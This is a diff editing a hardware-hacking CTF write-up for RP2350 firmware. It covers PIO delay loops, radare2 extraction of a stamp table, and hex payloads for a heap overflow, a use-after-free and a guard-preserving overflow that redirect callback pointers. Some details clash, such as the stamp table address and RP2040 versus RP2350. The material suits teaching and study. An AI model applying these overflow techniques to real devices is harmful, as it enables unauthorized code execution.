@@ -1,6 +1,6 @@
 # Second Winner: @xvortex (Diego Soria)
 # HardwareHackingEs2026 CTF Writeup
-
+---
 # 1. Long Short
 
 ## Statement
@@ -63,7 +63,7 @@ They are exactly 4 consecutive addresses with a 4-byte stride.
 [0x10033298]> pxw 16
 0x10033298  0x00004b00 0x00002580 0x00009600 0x0001c200  .K...%..........
 ```
-We can also see that exactly `0x3C` bytes away lives the string "CHALLENGE: In order crazy baud rates!", so it undoubtedly belongs to this challenge.
+We can also see that exactly `0x3C` bytes away is the string "CHALLENGE: In order crazy baud rates!", so this array belongs to the challenge.
 
 ![code-snapshot131.png](Final/code-snapshot131.png)
 
@@ -87,13 +87,13 @@ The LED and AUX pins must follow this EXACT pattern:
   4) LED OFF (stay off),      GPIO20=0 GPIO21=0
 ```
 
-In addition, you have to send 10 stamp bytes followed by 16-bit words in hexadecimal containing the PIO instructions.
+You also have to send 10 stamp bytes followed by 16-bit words in hexadecimal containing the PIO instructions.
 
 ## Analysis
 
-Before getting into it, it's worth being clear about three things regarding PIO.
+Before getting into it, three things about PIO.
 
-**1. Each instruction is 16 bits with this format:**
+Each instruction is 16 bits with this format:
 
 ```
 bits 15..13 : opcode (JMP, WAIT, IN, OUT, PUSH/PULL, MOV, IRQ, SET)
@@ -103,21 +103,17 @@ bits 7..5   : destination/condition
 bits 4..0   : operand (5-bit register → values 0..31)
 ```
 
-Since side-set is **non-optional**, every instruction must carry bit 12 set to the LED state corresponding to that phase.
+Since side-set is non-optional, every instruction must carry bit 12 set to the LED state corresponding to that phase.
 
-**2. The clock runs at 10 kHz**
-
-Each cycle therefore lasts 100 µs, which, translated to the requested pattern, gives:
+The clock runs at 10 kHz, so each cycle lasts 100 µs. Translated to the requested pattern:
 
 - Phase 1: ~3 s → ~30,000 cycles
 - Phase 2: ~8 s → ~80,000 cycles
 - Phase 3: ~10 s → ~100,000 cycles
 
-**3. PIO only has X and Y as working registers, and the `set` literals are 5 bits (max 31).**
+PIO only has X and Y as working registers, and the `set` literals are 5 bits (max 31). This limitation complicates the delay calculation. A simple loop like `set x, 31 / jmp x--, label [15]` gives at most `32 * 16 = 512` cycles. Nesting two loops (Y outer, X inner) gets you to `32 * 32 * 16 = 16,384` cycles, barely 1.6 s. Far from the ten seconds of phase 3.
 
-This limitation complicates the delay calculation. A simple loop like `set x, 31 / jmp x--, label [15]` gives at most `32 * 16 = 512` cycles. Nesting two loops (Y outer, X inner) gets you to `32 * 32 * 16 = 16,384` cycles, barely 1.6 s. Far from the ten seconds of phase 3.
-
-### The trick: ISR as a third counter
+### ISR as a third counter
 
 PIO has no stack nor a third scratch register, but it does have ISR and OSR (the shift registers). The `mov isr, y` and `mov y, isr` instructions are legal, so ISR can be used as a temporary store for an additional counter:
 
@@ -129,7 +125,7 @@ PIO has no stack nor a third scratch register, but it does have ISR and OSR (the
   | mov y, isr | restore the pass counter |
   | jmp y--, ... | decrement and loop back if any left |
 
-With three nested levels the margin is already enough: if each pass lasts about 15,400 cycles, six passes add up to 92,000 cycles (~9.2 s), which covers the longest phase.
+With three nested levels there's enough margin: if each pass lasts about 15,400 cycles, six passes add up to 92,000 cycles (~9.2 s), enough for the longest phase.
 
 ### Design of the phases
 
@@ -146,7 +142,7 @@ The skeleton is the same for the three active phases:
 | mov y, isr | [15] | recover the pass counter |
 | jmp y--, pass_loop | [15] | closing of the pass loop |
 
-The timings are fine-tuned with two parameters: the **delay of the inner jmp** (if you want to shorten a phase) and the **number of passes** (initial value of Y before the `mov isr`). Tuning:
+The timings are fine-tuned with two parameters: the delay of the inner jmp (if you want to shorten a phase) and the number of passes (initial value of Y before the `mov isr`).
 
 - Phase 1 (~3 s): 2 passes. I lower the delay of the inner jmp to 13 so as not to overshoot → comes out to ~3.08 s.
 - Phase 2 (~8 s): 5 passes with all delays at 15 → ~8.74 s.
@@ -211,7 +207,7 @@ Each instruction is a 16-bit word assembled from its fields. For example, `set y
 = 1111 1111 0101 1111 = 0xFF5F
 ```
  
-The stamp is still missing. If you send a random one, the challenge itself invites you to go find it, so it's time to download the recovery firmware and analyze it with radare2.
+The stamp is still missing. If you send a random one, the challenge tells you to go find it, so I download the recovery firmware and analyze it with radare2.
 
 ## Extracting the stamps
 
@@ -219,19 +215,16 @@ The stamp is still missing. If you send a random one, the challenge itself invit
 
 The RP2350 is a dual-core chip (ARM Cortex-M33 + RISC-V Hazard3). I open the binary with:
 
-- `-a riscv` — architecture
-- `-b 32` — 32-bit width
-- `-m 0x10000000` — map the content to the real flash address
+- `-a riscv` for the architecture
+- `-b 32` for 32-bit width
+- `-m 0x10000000` to map the content to the real flash address
 
 ![code-snapshot135.png](Final/code-snapshot135.png)
 
 ### 2. Sanity check: confirm RISC-V and not ARM Thumb
 
-In ARM Thumb, the typical return is `bx lr` (`0x4770`, bytes `70 47`). In compressed RISC-V it's `c.ret` (`0x8082`, bytes `82 80`). Counting occurrences of each:
-
+In ARM Thumb, the typical return is `bx lr` (`0x4770`, bytes `70 47`). In compressed RISC-V it's `c.ret` (`0x8082`, bytes `82 80`). Counting occurrences of each one we can se the binary is RISC-V.
 ![code-snapshot136.png](Final/code-snapshot136.png)
-
-671 occurrences of `c.ret` against 1 of `bx lr`. Confirmed: the binary is RISC-V.
 
 ### 3. Finding the stamp verification strings
 
@@ -250,7 +243,7 @@ Three occurrences, one for each challenge that uses a stamp:
 - `0x35de4`: specific to user buffer (heap overflows)
 - `0x37650`: specific to `new_buf` (use-after-free)
 
-**An important detail**: `izz` returns `paddr == vaddr` (both at `0x000352e4`). This happens because r2 carries over the file offset without applying the `-m` mapping in the string metadata. The real memory address is `paddr + 0x10000000 = 0x100352e4`. It can be verified:
+One detail: `izz` returns `paddr == vaddr` (both at `0x000352e4`) because r2 carries over the file offset without applying the `-m` mapping in the string metadata. The real memory address is `paddr + 0x10000000 = 0x100352e4`:
 
 ```bash
 [0x10000000]> s 0x000352e4
@@ -266,7 +259,7 @@ Three occurrences, one for each challenge that uses a stamp:
 0x10035304  2062 7974 6573 2061 7265 206e 6f74 2074   bytes are not t
 ```
 
-At the second address the string does indeed appear. You must always add `0x10000000` to the addresses returned by `izz`.
+At the second address the string appears. You always have to add `0x10000000` to the addresses returned by `izz`.
 
 ### 4. Attempt at the "classic" path: xrefs to the string
 
@@ -296,15 +289,15 @@ INFO: Finding xrefs in noncode sections (e anal.in=io.maps.x; aav)
 [0x100352e4]>
 ```
 
-`axt` returns nothing. The reason is that RISC-V loads addresses in two phases with `auipc + addi` (PC-relative) or shoves almost everything into the global section via `gp` (global pointer). Radare2 doesn't correctly resolve that pair in its default analysis, so PC-relative xrefs are lost. This can be seen clearly by inspecting the disassembly near the startup:
+`axt` returns nothing. The reason is that RISC-V loads addresses in two phases with `auipc + addi` (PC-relative) or shoves almost everything into the global section via `gp` (global pointer). Radare2 doesn't correctly resolve that pair in its default analysis, so PC-relative xrefs are lost. This can be seen by inspecting the disassembly near the startup:
 
 ![image.png](Final/image%201.png)
 
-So we need to switch approaches.
+So I switch approaches.
 
-### 5. Change of strategy: landmarks in rodata
+### 5. Landmarks in rodata
 
-If the code isn't useful, go for the data. The stamps are 10 apparently random bytes plus 2 of padding, grouped in a table, and they should live in `.rodata` near other constants. What nearby constants are there? The build date: the C macros `__DATE__` and `__TIME__` insert predictable strings of the form `"Apr  6 2026"` and `"02:35:13"`.
+If the code isn't useful, I go for the data. The stamps are 10 apparently random bytes plus 2 of padding, grouped in a table, and they should live in `.rodata` near other constants. A good nearby constant is the build date: the C macros `__DATE__` and `__TIME__` insert predictable strings of the form `"Apr  6 2026"` and `"02:35:13"`.
 
 ```bash
 [0x10000100]> izz~Apr
@@ -316,7 +309,7 @@ If the code isn't useful, go for the data. The stamps are 10 apparently random b
 
 The first one, at `paddr 0x3203c`, is isolated and at the start of its rodata area (it's not part of another phrase like "Compiled: Apr..."). Its real address is `0x1003203c`.
 
-ASCII strings are stored in a block inside `rodata`, so just before that date we should find the non-text constants, ideal candidates to contain the stamps.
+ASCII strings are stored in a block inside `rodata`, so just before that date there should be non-text constants, which is where the stamps likely live.
 
 ### 6. Inspection of the area before the landmark
 
@@ -324,11 +317,11 @@ I step back a bit and dump 96 bytes to see the transition:
 
 ![2026-04-20_16-12.png](Final/2026-04-20_16-12.png)
 
-There it is. Three unmistakable signals:
+Three things stand out:
 
-1. **Prior zero zone** (`0x10031fe0`–`0x10031fff`): alignment padding, indicates the end of the previous section.
-2. **48-byte block with high entropy** at `0x10032000`–`0x10032030`, with a clear pattern: `10 random bytes + 00 00` repeated four times.
-3. **Immediately after** the strings start: `"02:35:13"` (from `__TIME__`) and then `"Apr "` (from `__DATE__`).
+1. A zero zone (`0x10031fe0`–`0x10031fff`) that looks like alignment padding marking the end of the previous section.
+2. A 48-byte block with high entropy at `0x10032000`–`0x10032030`, following a clear pattern: 10 random bytes followed by `00 00`, repeated four times.
+3. Right after that, the strings start: `"02:35:13"` (from `__TIME__`) and then `"Apr "` (from `__DATE__`).
 
 That zone between the padding and the strings is the stamp table.
 
@@ -375,7 +368,7 @@ Distance from user_buf[0] to target->callback: 84 bytes
 
 The challenge asks for bytes in hexadecimal and lets you write into `user_buf` without bounds checking. Right after it there is a struct with a function pointer at the end. The idea is to overflow the buffer, overwrite the pointer, and make it point to `heap_solved()` instead of `heap_not_solved()`.
 
-Additional restriction: the first 10 bytes of the payload must be the correct stamp for the challenge, extracted from the firmware by reverse engineering (already solved in the previous section).
+There's an extra restriction: the first 10 bytes of the payload must be the correct stamp for the challenge, extracted from the firmware by reverse engineering (already solved in the previous section).
 
 ## Layout analysis
 
@@ -388,24 +381,12 @@ The first thing is to do the math with the addresses the firmware itself provide
 
 Adding up: 64 + 4 + 16 = 84 bytes to the pointer, matching what the challenge indicates.
 
-TLSF places a small header in front of each chunk with the size and a couple of flags (`FREE`, `PREV_FREE`). Those are the 4 bytes that sit "in between". Stepping on them is fine because, between my write and the callback call, the firmware performs no `malloc` or `free`, so the allocator doesn't even look at that corrupted header. With subsequent heap operations there would indeed be danger, since consolidating free chunks could lead to an arbitrary write.
 
-## Stamp extraction
+Those 4 bytes in between are a TLSF chunk header (size and flags). Stomping on them is harmless here since no `malloc` or `free` runs before the callback. With more heap activity it would be risky: when TLSF coalesces free chunks, a bad header can turn into an arbitrary write.
 
-The firmware contains a table with 4 stamps in `.rodata`. I located it by opening the UF2, converting it to `.bin`, and searching for the high-entropy zone near the strings `"STAMP CHECK FAILED"` and `"Stamp check PASSED!"`.
+## Stamp
 
-The table resides at `flash 0x10031F00` (offset `0x32000` of the bin):
-
-```
-stamp[0] = 0E B2 C2 CC 6B 40 AA FF E4 5F
-stamp[1] = CA E6 51 2D 80 2E 82 EA 08 59
-stamp[2] = 5A F7 E7 20 10 E3 91 F2 00 1D
-stamp[3] = 15 D5 97 3E DD 1E 2A 74 1A CE
-```
-
-Each entry occupies 12 bytes (10 of stamp + 2 of padding). I wasn't able to get direct xrefs because the code is RISC-V and uses `auipc+addi` addressing or `gp`-relative addressing, and radare2 wasn't resolving them even with `aaaa`. I tested them empirically and the one that works for this challenge is **stamp[0]**: `0E B2 C2 CC 6B 40 AA FF E4 5F`.
-
-A detail: the binary is RISC-V RV32, not ARM Thumb. The RP2350 includes both cores (Cortex-M33 and Hazard3), but this firmware runs on the Hazard3. I confirmed it by counting return patterns: `c.ret = 0x8082` appeared a huge number of times and `bx lr = 0x4770`, zero. This matters when disassembling, as you have to launch r2 with `-a riscv -b 32`.
+Using the table already extracted in the previous challenge, the one that works here is stamp[0]: `0E B2 C2 CC 6B 40 AA FF E4 5F`.
 
 ## Payload construction
 
@@ -419,13 +400,15 @@ Total: 88 bytes.
 [ 4]   final pointer ..... 0x20001680 in little-endian = 80 16 00 20
 ```
 
-Result on a single line, just as it's entered into the prompt:
+On a single line:
 
 ```
 0E B2 C2 CC 6B 40 AA FF E4 5F 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 42 42 42 42 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 80 16 00 20
 ```
 
-I used 0x41 for the user buffer, 0x42 for the TLSF header, and 0x43 for the struct fields. That way, if something fails, a dump lets you tell which zone is being overwritten incorrectly. In the end it wasn't needed, but it's better to set up that visibility than to have everything with the same byte.
+I used `0x41` for the user buffer, `0x42` for the TLSF header, and `0x43` for the struct fields, so that if something fails, a dump lets you tell which zone is being overwritten incorrectly. In the end it wasn't needed, but better to set up that visibility than to have everything with the same byte.
+
+---
 
 # 5. The PSRAM HEAP Use-After-Free
 
@@ -450,19 +433,19 @@ Step 3: Allocating new buffer of SAME size (20 bytes)...
   *** SAME address as freed victim! The allocator reused the memory. ***
 ```
 
-That is: it reserves a struct, frees it but keeps the old pointer (now dangling), asks for another block of the same size (20 bytes), TLSF places it in exactly the hole that was just freed, and lets you write into that new block. Finally it invokes `victim->callback()` using the old pointer.
+It reserves a struct, frees it but keeps the old pointer (now dangling), asks for another block of the same size (20 bytes), TLSF places it in exactly the hole that was just freed, and lets you write into that new block. Finally it invokes `victim->callback()` using the old pointer.
 
 Since `victim` and `new_buf` are physically the same chunk of memory, whatever I write into `new_buf` is reinterpreted as the fields of `victim`. The pointer is at offset 16, so I control which function the callback jumps to.
 
 ## Analysis: why it always lands in the same slot
 
-It comes down to TLSF's LIFO policy. On `free`, the freed chunk is inserted at the head of the free-list of the corresponding size. If right after that a `malloc` of that same size is requested, the allocator returns that same chunk. It's the behavior we would seek manually to do heap grooming, except here it comes served on a plate.
+TLSF uses a LIFO policy. On `free`, the freed chunk is inserted at the head of the free-list of the corresponding size. If right after that a `malloc` of that same size is requested, the allocator returns that same chunk. It's the behavior you would seek manually to do heap grooming, except here it comes served on a plate.
 
 The same thing happens with dlmalloc (fastbins), glibc (tcache), and others. It's not exclusive to TLSF.
 
 ## The stamp
 
-Same table as in challenge `p`, at `flash 0x10031F00`. Testing empirically, for the UAF the one that works is **stamp[1]**: `CA E6 51 2D 80 2E 82 EA 08 59`.
+Same table as in challenge `p`, at `flash 0x10031F00`. Testing empirically, for the UAF the one that works is stamp[1]: `CA E6 51 2D 80 2E 82 EA 08 59`.
 
 ## Payload construction
 
@@ -515,29 +498,29 @@ TLSF hands out three blocks in this order:
 2. `guard struct` (16 bytes): with a magic value `0x69CAFE69` at its offset 0.
 3. `target struct` (16 bytes): with the callback at its offset 12.
 
-Before calling `target->callback()`, the firmware checks that `guard->magic == 0x69CAFE69`. If I break that value while crossing the block, the check fails. Goal: overflow up to the target's callback without altering the magic.
+Before calling `target->callback()`, the firmware checks that `guard->magic == 0x69CAFE69`. If I break that value while crossing the block, the check fails. So I need to overflow up to the target's callback without altering the magic.
 
 ## Analysis: calculating the distances
 
-The challenge warns: "No distances are given!". Time to do the math by hand.
+The challenge warns: "No distances are given!", so I do the math by hand.
 
-**user_buf[0] → guard[0]:**
+From user_buf[0] to guard[0]:
 
 ```
 0x11000B20 - 0x11000AFC = 0x24 = 36 bytes
 ```
 
-Consistent with: 32 bytes of `user_buf` + 4 bytes of the next chunk's TLSF header = 36.
+Which matches: 32 bytes of `user_buf` + 4 bytes of the next chunk's TLSF header = 36.
 
-**user_buf[0] → target[0]:**
+From user_buf[0] to target[0]:
 
 ```
 0x11000B34 - 0x11000AFC = 0x38 = 56 bytes
 ```
 
-Consistent with: 36 + 16 (entire guard) + 4 (target's TLSF header) = 56.
+Which matches: 36 + 16 (entire guard) + 4 (target's TLSF header) = 56.
 
-**user_buf[0] → target->callback:**
+From user_buf[0] to target->callback:
 
 ```
 56 + 12 (offset of the callback within the target) = 68 bytes
@@ -553,24 +536,25 @@ Total: 72 bytes.
 [10]  stamp ............. CA E6 51 2D 80 2E 82 EA 08 59
 [22]  filler (0x41) ..... completes the 32 bytes of user_buf
 [ 4]  TLSF header ....... the guard's, overwritten with 0x42
-[ 4]  magic ............. 69 FE CA 69 — touch a byte and the check fails
+[ 4]  magic ............. 69 FE CA 69, touch a byte and the check fails
 [12]  filler (0x43) ..... rest of the guard, not verified
 [ 4]  TLSF header ....... the target's, overwritten with 0x44
 [12]  filler (0x45) ..... target fields before the callback
 [ 4]  callback .......... 0x20001A4E in little-endian = 4E 1A 00 20
 ```
 
-I keep the trick of using a different byte in each zone (`0x41`, `0x43`, `0x45` in the three filler zones; `0x42` and `0x44` in the two TLSF headers). That way, if something crashes, a dump shows at a glance which region is being overwritten incorrectly. The TLSF headers normally contain size and free-list flags, but between my write and the callback call there is no `malloc` or `free`, so nobody reads them again. Zeros would work just the same.
+I keep the trick of using a different byte in each zone (`0x41`, `0x43`, `0x45` in the three filler zones; `0x42` and `0x44` in the two TLSF headers), so if something crashes, a dump shows at a glance which region is being overwritten incorrectly. The TLSF headers normally contain size and free-list flags, but between my write and the callback call there is no `malloc` or `free`, so nobody reads them again. Zeros would work just the same.
 
 ## Final payload
 
-Line ready to be entered into the prompt:
+On a single line:
 
 ```
 CA E6 51 2D 80 2E 82 EA 08 59 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 42 42 42 42 69 FE CA 69 43 43 43 43 43 43 43 43 43 43 43 43 44 44 44 44 45 45 45 45 45 45 45 45 45 45 45 45 4E 1A 00 20
 ```
 
-The stamp used is **stamp[1]** from the table obtained from the firmware at `flash 0x10031F00`: `CA E6 51 2D 80 2E 82 EA 08 59`.
+The stamp used is stamp[1] from the table obtained from the firmware at `flash 0x10031F00`: `CA E6 51 2D 80 2E 82 EA 08 59`.
 
 # Conclusions
 
+This was my first hardware hacking CTF, and it won't be the last. I genuinely enjoyed every challenge, and you can feel the creativity behind them, making a simple puzzle into something worth sitting down for hours. Along the way I learnd a lot about how the RP2040's PIO actually works under the hood, someting that really caugth my curiosity. It made me want to spend more time messing around with the RP2040 to really understand where its limits are.
